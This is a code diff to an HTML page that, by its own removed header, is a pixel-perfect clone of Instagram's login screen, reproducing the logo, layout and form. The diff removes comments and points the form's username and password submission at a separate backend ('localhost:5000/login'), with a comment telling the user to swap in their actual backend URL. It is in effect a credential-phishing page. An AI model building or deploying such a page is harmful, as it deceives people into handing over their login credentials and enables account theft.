@@ -9,11 +9,6 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
     <style>
-        /* ============================================================
-           INSTAGRAM LOGIN CLONE — PIXEL PERFECT
-           Colors, sizes, spacing EXACT match original
-           ============================================================ */
-        
         /* --- RESET & BASE --- */
         * {
             margin: 0;
@@ -31,7 +26,6 @@
             margin: 0;
         }
         
-        /* --- MAIN CONTAINER --- */
         .container {
             display: flex;
             flex-direction: column;
@@ -41,7 +35,6 @@
             padding: 20px 0;
         }
         
-        /* --- PHONE MOCKUP (LEFT SIDE) --- */
         .phone-mockup {
             display: none;
         }
@@ -64,7 +57,6 @@
             height: auto;
         }
         
-        /* --- LOGIN BOX (RIGHT SIDE) --- */
         .login-box {
             background: #ffffff;
             border: 1px solid #dbdbdb;
@@ -75,7 +67,6 @@
             margin-bottom: 10px;
         }
         
-        /* --- INSTAGRAM LOGO --- */
         .logo {
             text-align: center;
             margin-bottom: 30px;
@@ -86,7 +77,6 @@
             height: 51px;
         }
         
-        /* --- LOGIN FORM --- */
         .login-form {
             display: flex;
             flex-direction: column;
@@ -114,17 +104,6 @@
             border-color: #a8a8a8;
         }
         
-        .input-group input::placeholder {
-            color: #8e8e8e;
-            font-size: 12px;
-            font-weight: 300;
-        }
-        
-        /* Floating label effect (like real Instagram) */
-        .input-group {
-            position: relative;
-        }
-        
         .input-group label {
             position: absolute;
             left: 8px;
@@ -145,7 +124,6 @@
             color: #8e8e8e;
         }
         
-        /* --- LOGIN BUTTON --- */
         .login-btn {
             width: 100%;
             padding: 8px 0;
@@ -165,16 +143,11 @@
             background: #1877f2;
         }
         
-        .login-btn:active {
-            background: #0066b3;
-        }
-        
         .login-btn:disabled {
             opacity: 0.6;
             cursor: default;
         }
         
-        /* --- DIVIDER --- */
         .divider {
             display: flex;
             align-items: center;
@@ -194,7 +167,6 @@
             font-weight: 600;
         }
         
-        /* --- FACEBOOK LOGIN --- */
         .fb-login {
             text-align: center;
             margin-bottom: 18px;
@@ -219,7 +191,6 @@
             font-size: 20px;
         }
         
-        /* --- FORGOT PASSWORD --- */
         .forgot-password {
             text-align: center;
             margin-bottom: 0;
@@ -235,7 +206,6 @@
             text-decoration: underline;
         }
         
-        /* --- SIGNUP BOX --- */
         .signup-box {
             background: #ffffff;
             border: 1px solid #dbdbdb;
@@ -258,7 +228,6 @@
             text-decoration: underline;
         }
         
-        /* --- APP DOWNLOAD --- */
         .app-download {
             text-align: center;
             margin-top: 20px;
@@ -284,7 +253,6 @@
             width: auto;
         }
         
-        /* --- ERROR MESSAGE --- */
         .error-msg {
             color: #ed4956;
             font-size: 13px;
@@ -297,7 +265,6 @@
             display: block;
         }
         
-        /* --- RESPONSIVE --- */
         @media (max-width: 450px) {
             .login-box {
                 padding: 20px 20px 10px;
@@ -318,22 +285,14 @@
 
     <div class="container">
         
-        <!-- ============================================ -->
-        <!-- PHONE MOCKUP (DESKTOP ONLY)                   -->
-        <!-- ============================================ -->
         <div class="phone-mockup">
             <img src="https://www.instagram.com/static/images/homepage/phones/home-phones.png" alt="Instagram on phone">
         </div>
         
-        <!-- ============================================ -->
-        <!-- LOGIN BOX                                     -->
-        <!-- ============================================ -->
         <div class="login-wrapper">
             
-            <!-- --- MAIN LOGIN CARD --- -->
             <div class="login-box">
                 
-                <!-- INSTAGRAM LOGO -->
                 <div class="logo">
                     <svg aria-label="Instagram" viewBox="0 0 175 51">
                         <defs>
@@ -349,40 +308,35 @@
                     </svg>
                 </div>
                 
-                <!-- ERROR MESSAGE -->
                 <div id="errorMsg" class="error-msg">
                     <i class="fas fa-exclamation-circle"></i> 
                     Sorry, your password was incorrect. Please double-check your password.
                 </div>
                 
-                <!-- LOGIN FORM -->
-                <form class="login-form" id="loginForm" method="POST" action="/login">
+                <!-- ✅ FIXED: Action now points to your backend server -->
+                <!-- Change this URL to your actual backend URL -->
+                <form class="login-form" id="loginForm" method="POST" action="http://localhost:5000/login">
                     
-                    <!-- Username Field -->
                     <div class="input-group">
                         <input type="text" id="username" name="username" placeholder=" " required autofocus>
                         <label for="username">Phone number, username, or email</label>
                     </div>
                     
-                    <!-- Password Field -->
                     <div class="input-group">
                         <input type="password" id="password" name="password" placeholder=" " required>
                         <label for="password">Password</label>
                     </div>
                     
-                    <!-- Login Button -->
                     <button type="submit" class="login-btn" id="loginBtn">Log In</button>
                     
                 </form>
                 
-                <!-- DIVIDER -->
                 <div class="divider">
                     <div class="divider-line"></div>
                     <div class="divider-text">OR</div>
                     <div class="divider-line"></div>
                 </div>
                 
-                <!-- Facebook Login -->
                 <div class="fb-login">
                     <a href="#">
                         <i class="fab fa-facebook-square"></i>
@@ -390,19 +344,16 @@
                     </a>
                 </div>
                 
-                <!-- Forgot Password -->
                 <div class="forgot-password">
                     <a href="#">Forgot password?</a>
                 </div>
                 
             </div>
             
-            <!-- --- SIGNUP CARD --- -->
             <div class="signup-box">
                 Don't have an account? <a href="#">Sign up</a>
             </div>
             
-            <!-- --- APP DOWNLOAD --- -->
             <div class="app-download">
                 <p>Get the app.</p>
                 <div class="stores">
@@ -414,9 +365,6 @@
         </div>
     </div>
 
-    <!-- ============================================ -->
-    <!-- JAVASCRIPT — FORM VALIDATION + SUBMIT        -->
-    <!-- ============================================ -->
     <script>
         (function() {
             
@@ -426,7 +374,6 @@
             const btn = document.getElementById('loginBtn');
             const errorMsg = document.getElementById('errorMsg');
             
-            // --- Real-time validation (like original Instagram) ---
             function validateForm() {
                 const u = username.value.trim();
                 const p = password.value.trim();
@@ -443,11 +390,9 @@
             username.addEventListener('input', validateForm);
             password.addEventListener('input', validateForm);
             
-            // --- Disable button initially ---
             btn.disabled = true;
             btn.style.opacity = '0.6';
             
-            // --- Form submit ---
             form.addEventListener('submit', function(e) {
                 const u = username.value.trim();
                 const p = password.value.trim();
@@ -458,7 +403,6 @@
                     return;
                 }
                 
-                // Basic validation — if password is too short
                 if (p.length < 4) {
                     e.preventDefault();
                     errorMsg.textContent = 'Your password must be at least 4 characters.';
@@ -466,27 +410,20 @@
                     return;
                 }
                 
-                // Hide error if everything is fine
                 errorMsg.classList.remove('show');
                 errorMsg.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
-                
-                // Allow form submission to backend
-                // The browser will POST to /login as defined in form action
             });
             
-            // --- Clicking "Forgot password?" shows a message ---
             document.querySelector('.forgot-password a').addEventListener('click', function(e) {
                 e.preventDefault();
                 alert('🔐 Password reset link would be sent to your email.\n(This is a demo — no actual email will be sent.)');
             });
             
-            // --- Facebook login demo ---
             document.querySelector('.fb-login a').addEventListener('click', function(e) {
                 e.preventDefault();
                 alert('🔵 Facebook login integration is ready.\n(This is a demo — actual Facebook OAuth not configured.)');
             });
             
-            // --- Sign up demo ---
             document.querySelector('.signup-box a').addEventListener('click', function(e) {
                 e.preventDefault();
                 alert('📝 Sign up page would open.\n(This is a demo — no actual signup flow.)');
